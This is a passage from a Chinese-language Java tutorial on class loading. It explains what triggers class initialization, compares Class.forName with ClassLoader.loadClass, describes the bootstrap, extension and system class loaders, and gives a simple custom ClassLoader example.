    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>要注意<strong>类初始化</strong>和<strong>对象初始化</strong>概念的区分，二者的含义是不同的。</p>
<ul>
<li><p><strong>类初始化</strong>：执行 <code>&lt;clinit&gt;</code>（静态变量赋值 + 静态代码块），只会执行一次，发生在“类的首次主动使用”时。</p>
</li>
<li><p><strong>构造函数</strong>：是 <code>&lt;init&gt;</code>，在<strong>创建对象时</strong>执行，可以执行多次，每 new 一个实例就会执行一次。</p>
</li>
</ul>
<p>也就是说<strong>构造函数是用于创建类实例的函数</strong>，构造函数的执行与类的初始化无关。构造函数只会在 <strong>实例化类时</strong>才会执行，而不是在类的加载和初始化时。即只有在通过 <code>new</code> 操作符或反射机制创建实例时，才会调用构造函数。</p>

    </div>
  </div>

<h4 id="触发类初始化的事件"><a href="#触发类初始化的事件" class="headerlink" title="触发类初始化的事件"></a>触发类初始化的事件</h4><p>初始化阶段是类加载的最后一步，它发生在类的首次使用时。具体来说，<strong>触发初始化的典型时机</strong>有下面几种：</p>
<ul>
<li><p><strong>访问类的静态变量</strong>（不是 <code>final</code> 常量）：当访问类的某个<strong>非编译期常量的静态变量</strong>时，必须触发类初始化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">// 非 final</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(A.x); <span class="comment">// 触发 A 初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>static final</code> <strong>编译期常量</strong>不会触发初始化，因为常量值在编译阶段就会放进调用类的常量池里。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CONST</span> <span class="operator">=</span> <span class="number">100</span>; <span class="comment">// 编译期常量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(B.CONST); <span class="comment">// 不触发 B 初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>
</li>
<li><p><strong>调用类的静态方法</strong> ：调用类中的静态方法时，必须先初始化类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; System.out.println(<span class="string">&quot;C 初始化&quot;</span>); &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        C.foo(); <span class="comment">// 触发初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用反射</strong> ：调用 <code>Class.forName(&quot;类名&quot;)</code> 会触发类的初始化；通过反射调用方法（如 <code>clazz.getMethod(...).invoke(...)</code>）也会触发。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; System.out.println(<span class="string">&quot;D 初始化&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;D&quot;</span>); <span class="comment">// 触发初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>初始化子类时，必须先初始化父类</strong>，即当初始化一个类时，若它有父类，必须保证父类先完成初始化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; System.out.println(<span class="string">&quot;Parent 初始化&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; System.out.println(<span class="string">&quot;Child 初始化&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Child</span>(); <span class="comment">// 输出：Parent 初始化 → Child 初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>JVM 启动时指定的主类</strong> ：例如执行 <code>java MainClass</code> 时，<code>MainClass</code> 一定会被初始化，因为 JVM 要调用 <code>main</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123; System.out.println(<span class="string">&quot;MainClass 初始化&quot;</span>); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// java MainClass → 输出 &quot;MainClass 初始化&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h2><p>在 Java 中，类加载可以分为两种主要方式：<strong>显式类加载（Explicit Class Loading）</strong> 和 <strong>隐式类加载（Implicit Class Loading）</strong>。</p>
<h3 id="显式类加载（Explicit-Class-Loading）"><a href="#显式类加载（Explicit-Class-Loading）" class="headerlink" title="显式类加载（Explicit Class Loading）"></a>显式类加载（Explicit Class Loading）</h3><p><strong>显式类加载</strong>是指开发者显式地调用某些 API 或者显式指明要加载某个类，通常通过 <strong><code>Class.forName(...)</code><strong>、</strong><code>ClassLoader.loadClass(...)</code></strong> 等方法来完成。这种方式通常用于在运行时动态加载类。</p>
<h4 id="通过反射机制加载"><a href="#通过反射机制加载" class="headerlink" title="通过反射机制加载"></a>通过反射机制加载</h4><p>在 Java 中，<code>Class.forName</code> 是最常见的显式加载类的方式，它有两个重载：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className, <span class="type">boolean</span> initialize, ClassLoader loader)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException;</span><br></pre></td></tr></table></figure></div>

<p>注意这里 <strong><code>className</code> 必须是类的全限定名（Fully Qualified Name）</strong>，否则会抛 <code>ClassNotFoundException</code>。</p>
<blockquote>
<p>在 Java 中，<strong>全限定名就是类在 JVM 里的唯一身份标识</strong>，它由 <strong>完整的包名 + 类名</strong> 组成，例如 <code>&quot;java.util.ArrayList&quot;</code>。内部类要用 <code>$</code> 表示，例如 <code>&quot;java.util.Map$Entry&quot;</code>。</p>
</blockquote>
<p>其中第二种重载多了 <code>initialize</code> 和 <code>loader</code> 参数：</p>
<ul>
<li><strong><code>initialize</code></strong><ul>
<li>为 <code>true</code> 时，类在加载时会立即触发初始化（执行 <code>&lt;clinit&gt;</code>：静态变量赋值 + 静态代码块）。</li>
<li>为 <code>false</code> 时，仅仅加载类，但不会初始化。</li>
</ul>
</li>
<li><strong><code>loader</code></strong><ul>
<li>指定加载该类的类加载器。</li>
<li>如果传入 <code>null</code>，表示使用 <strong>引导类加载器（Bootstrap ClassLoader）</strong> 来加载。</li>
<li>如果传入自定义的类加载器，则由该加载器负责加载。</li>
</ul>
</li>
</ul>
<p>第一个重载 <code>Class.forName(String className)</code> 等价于使用 <strong>调用者的类加载器</strong>，并且 <code>initialize=true</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;Foo&quot;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.example.Foo&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.getClass().getClassLoader());</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>JVM 会用「谁调用，就用谁的加载器」的原则，来决定默认的类加载器。</p>
<ul>
<li><strong>调用者类</strong> &#x3D; 调用 <code>Class.forName</code> 这一行代码所在的类。</li>
<li><strong>调用者的类加载器</strong> &#x3D; <strong>把这个调用者类本身加载进 JVM 的类加载器</strong>。</li>
</ul>

    </div>
  </div>

<p>如果想显式用 <strong>系统类加载器</strong>，应该这样写：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;Foo&quot;</span>, <span class="literal">true</span>, ClassLoader.getSystemClassLoader());</span><br></pre></td></tr></table></figure></div>

<p>如果想用 <strong>Bootstrap 类加载器</strong>（加载核心类库），则传 <code>null</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.String&quot;</span>, <span class="literal">true</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<h4 id="通过类加载器加载"><a href="#通过类加载器加载" class="headerlink" title="通过类加载器加载"></a>通过类加载器加载</h4><p>在 Java 中，可以通过 <code>ClassLoader</code> 的 <code>loadClass</code> 方法来显式加载类：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>ClassLoader</code> 是 Java 的一个 <strong>抽象类</strong>（<code>java.lang.ClassLoader</code>），所有类加载器都继承自它。</p>
</blockquote>
<p>不同于 <code>Class.forName(String className)</code>，<code>ClassLoader.loadClass(String name)</code> 默认只加载类，不会触发初始化。初始化仍然要等到类的<strong>主动使用</strong>（访问静态字段 &#x2F; 调用静态方法 &#x2F; <code>new</code> 实例 &#x2F; 反射调用等）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;com.example.Hello&quot;</span>); <span class="comment">// 只加载，不初始化</span></span><br><span class="line">clazz.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>).invoke(clazz.newInstance()); <span class="comment">// 实例化时才触发初始化</span></span><br></pre></td></tr></table></figure></div>

<p><code>loadClass(String name)</code> 实际调用的是另一个重载：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br></pre></td></tr></table></figure></div>

<ul>
<li>**<code>name</code>**：类的全限定名（如 <code>&quot;com.example.Hello&quot;</code>）</li>
<li>**<code>resolve</code>**：是否解析类（是否调用 <code>resolveClass</code>）</li>
</ul>
<p>默认的 <code>loadClass(String name)</code> 等价于：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> loadClass(name, <span class="literal">false</span>); <span class="comment">// 默认不解析</span></span><br></pre></td></tr></table></figure></div>

<p>因此默认的 <code>loadClass(String name)</code>：</p>
<ul>
<li><strong>只加载（Load）</strong>：读取字节码，生成 <code>Class&lt;?&gt;</code> 对象。</li>
<li><strong>不解析（Resolve&#x3D;false）</strong>：不会立即把符号引用替换成直接引用。</li>
<li><strong>不初始化</strong>：不会执行 <code>&lt;clinit&gt;</code>（静态变量赋值 + 静态代码块）。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>当 <code>Class.forName</code> 的 <strong><code>initialize=false</code></strong> 且使用的类加载器与你 <code>loadClass</code> 指定的类加载器一致时，两者等价：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式 1：不初始化</span></span><br><span class="line">Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;com.example.Foo&quot;</span>, <span class="literal">false</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式 2：只加载</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">Class&lt;?&gt; c2 = cl.loadClass(<span class="string">&quot;com.example.Foo&quot;</span>);</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="隐式类加载（Implicit-Class-Loading）"><a href="#隐式类加载（Implicit-Class-Loading）" class="headerlink" title="隐式类加载（Implicit Class Loading）"></a>隐式类加载（Implicit Class Loading）</h3><p><strong>隐式类加载</strong>是指在 Java 程序中，类的加载是由 JVM 自动触发的，不需要显式调用类加载方法。隐式加载通常发生在类的<strong>首次使用</strong>时，例如<strong>实例化对象</strong>、<strong>访问类的静态字段</strong>或<strong>调用静态方法</strong>等。</p>
<h4 id="通过实例化对象加载"><a href="#通过实例化对象加载" class="headerlink" title="通过实例化对象加载"></a>通过实例化对象加载</h4><p>当我们通过 <code>new</code> 关键字创建一个类的实例时，JVM 会自动加载该类。如果该类尚未被加载，JVM 会根据类加载器的机制来加载并初始化该类。</p>
<p>其中 <strong>类的静态块</strong>（<code>static &#123;&#125;</code>）会在类加载时被执行，<strong>构造函数</strong>则在实例化时被调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 隐式加载类并创建实例</span></span><br><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">hello.sayHello();</span><br></pre></td></tr></table></figure></div>

<h4 id="类的首次“主动使用”"><a href="#类的首次“主动使用”" class="headerlink" title="类的首次“主动使用”"></a>类的首次“主动使用”</h4><p>JVM 规范规定：<strong>类的首次“主动使用”会触发初始化</strong>。而触发初始化时，如果该类尚未加载，就会顺带把<strong>“加载”</strong>和<strong>“链接”</strong>也做了。</p>
<p>前面总结的触发类初始化的情境有：</p>
<ul>
<li>访问类的静态变量（不是 <code>final</code> 常量）</li>
<li>调用类的静态方法</li>
<li>初始化子类前，先初始化父类</li>
<li>JVM 启动时指定的主类</li>
</ul>
<p>在这种情境下 JVM 会自动加载该类，类的<strong>静态代码块被执行</strong>。但是由于类没有被实例化，因此<strong>构造函数不会被调用</strong>。</p>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p><strong>类加载器</strong>（<code>ClassLoader</code>）是 JVM 中负责 <strong>加载类字节码</strong> 的组件。它的作用是：</p>
<ul>
<li>在运行时把外部 <code>.class</code> 文件（或字节码流）<strong>加载到内存</strong>；</li>
<li>转化为 <code>Class</code> 对象，供程序使用；</li>
<li>实现 Java 的 <strong>动态类加载机制</strong>（类按需加载，而不是一次性全部加载）。</li>
</ul>
<p>简单说：类加载器决定了“某个类由谁负责加载”，同时也影响了类在 JVM 中的唯一性。</p>
<p>类加载器的<strong>核心特性</strong>有：</p>
<ul>
<li><strong>延迟加载（Lazy Loading）</strong> ：类只有在“首次主动使用”时才会被加载。</li>
<li><strong>双亲委派模型（Parent Delegation Model）</strong> ：加载类时，先委托父加载器 → 父加载器找不到，自己再尝试加载。</li>
<li><strong>类的唯一性</strong> ：<ul>
<li>JVM 判断两个类是否相同：不仅类名一致，还要 <strong>由同一个类加载器加载</strong>。</li>
<li>不同的类加载器即使加载了同名类，也会被认为是不同的类。</li>
</ul>
</li>
</ul>
<h3 id="类加载器的类型"><a href="#类加载器的类型" class="headerlink" title="类加载器的类型"></a>类加载器的类型</h3><p>Java 中的类加载器有几种不同的类型，每种类型都有不同的作用和责任。下面是 Java 中常见的几种类加载器： </p>
<h4 id="引导类加载器（Bootstrap-ClassLoader）"><a href="#引导类加载器（Bootstrap-ClassLoader）" class="headerlink" title="引导类加载器（Bootstrap ClassLoader）"></a>引导类加载器（Bootstrap ClassLoader）</h4><ul>
<li><strong>功能</strong> ：引导类加载器是 JVM 启动时创建的，负责加载 <strong>Java 标准库中的核心类</strong>，如 <code>java.lang.*</code>、<code>java.util.*</code> 等。</li>
<li><strong>实现</strong> ：引导类加载器由 C++ 编写，通常由 JVM 内部实现，无法在 Java 代码中直接访问，但它是所有其他类加载器的父加载器。</li>
<li><strong>加载的路径</strong> ：引导类加载器的加载路径通常于 <code>$JAVA_HOME/jre/lib</code> 或 <code>jre/lib/rt.jar</code> 中的类。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 <strong>Java 虚拟机</strong>（JVM）的层面，可以将这些类加载器大致分为两大类：</p>
<ul>
<li>一种是<strong>启动类加载器</strong>（Bootstrap ClassLoader）。这个类加载器由 C++ 实现，是 JVM 虚拟机自身的一部分，因此<strong>没有继承自 <code>java.lang.ClassLoader</code>，不能直接在 Java 代码中访问</strong>。</li>
<li>另一种就是所有<strong>其他的类加载器</strong>，些类加载器通常用 Java 语言实现，它们都<strong>继承自 <code>java.lang.ClassLoader</code> 类</strong>。</li>
</ul>

    </div>
  </div>

<h4 id="扩展类加载器（Extension-ClassLoader）"><a href="#扩展类加载器（Extension-ClassLoader）" class="headerlink" title="扩展类加载器（Extension ClassLoader）"></a>扩展类加载器（Extension ClassLoader）</h4><ul>
<li><strong>功能</strong> ：扩展类加载器负责加载 <strong>Java 扩展库中的类</strong>，通常是指位于 <code>jre/lib/ext</code> 目录下的由 JDK 提供的一些功能扩展类，例如 XML 解析（<code>javax.xml.*</code>）类</li>
<li><strong>实现</strong> ：扩展类加载器是由 <code>sun.misc.Launcher$ExtClassLoader</code> 实现的。</li>
<li><strong>加载的路径</strong> ：扩展类加载器的加载路径通常是 <code>jre/lib/ext</code> 目录下的类。</li>
</ul>
<h4 id="系统类加载器（System-ClassLoader）"><a href="#系统类加载器（System-ClassLoader）" class="headerlink" title="系统类加载器（System ClassLoader）"></a>系统类加载器（System ClassLoader）</h4><ul>
<li><strong>功能</strong> ：系统类加载器负责加载<strong>应用程序的类</strong>，通常是指项目中的 <code>.class</code> 文件或 JAR 包。</li>
<li><strong>实现</strong> ：系统类加载器是由 <code>sun.misc.Launcher$AppClassLoader</code> 实现的。它是最常用的类加载器，通常由用户代码通过 <code>ClassLoader.getSystemClassLoader()</code> 获取。</li>
<li><strong>加载的路径</strong> ：系统类加载器的类路加载径通常由环境变量 <code>CLASSPATH</code> 或命令行的 <code>-cp</code> 参数指定。系统类加载器加载的是程序类（即用户自定义类和第三方类库）。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在有的资料中<strong>系统类加载器（System ClassLoader）</strong>也被称为<strong>应用类加载器（Application ClassLoader）</strong>。</p>

    </div>
  </div>

<h4 id="自定义类加载器（Custom-ClassLoader）"><a href="#自定义类加载器（Custom-ClassLoader）" class="headerlink" title="自定义类加载器（Custom ClassLoader）"></a>自定义类加载器（Custom ClassLoader）</h4><p>在 Java 中，类加载器负责将 <code>.class</code> 文件加载到 JVM 中，生成类的 <code>Class</code> 对象。默认的类加载器（如系统类加载器、扩展类加载器等）已经能够满足大部分的类加载需求，但是在某些场景下，我们需要根据特定的规则来加载类，这时就需要使用 <strong>自定义类加载器</strong>（Custom ClassLoader）。</p>
<p>自定义类加载器需要继承 <code>java.lang.ClassLoader</code> 并重写其方法，尤其是 <code>findClass</code> 方法，该方法是加载类的核心方法。例如下面是一个自定义类加载器的示例代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 计算类文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath + File.separator + name.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">classFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!classFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Class &quot;</span> + name + <span class="string">&quot; not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(classFile)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) classFile.length()];</span><br><span class="line">            inputStream.read(classBytes);</span><br><span class="line">            <span class="comment">// 使用 defineClass 方法将字节码转换为 Class 对象</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Error reading class file&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>(<span class="string">&quot;path/to/classes&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载自定义类</span></span><br><span class="line">        Class&lt;?&gt; clazz = myClassLoader.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;Class loaded: &quot;</span> + clazz);</span><br><span class="line">        System.out.println(<span class="string">&quot;Object: &quot;</span> + obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载器的获取"><a href="#类加载器的获取" class="headerlink" title="类加载器的获取"></a>类加载器的获取</h3><p>在 Java 中可以使用不同的方式来获取类加载器。以下是几种常见的获取类加载器的方法：</p>
<h4 id="获取当前类的类加载器"><a href="#获取当前类的类加载器" class="headerlink" title="获取当前类的类加载器"></a>获取当前类的类加载器</h4><p>要获取当前类（即包含当前代码的类）的类加载器，可以使用 <code>Class</code> 类的 <code>getClassLoader()</code> 方法。这个方法返回一个 <code>ClassLoader</code> 实例，表示当前类的类加载器。</p>
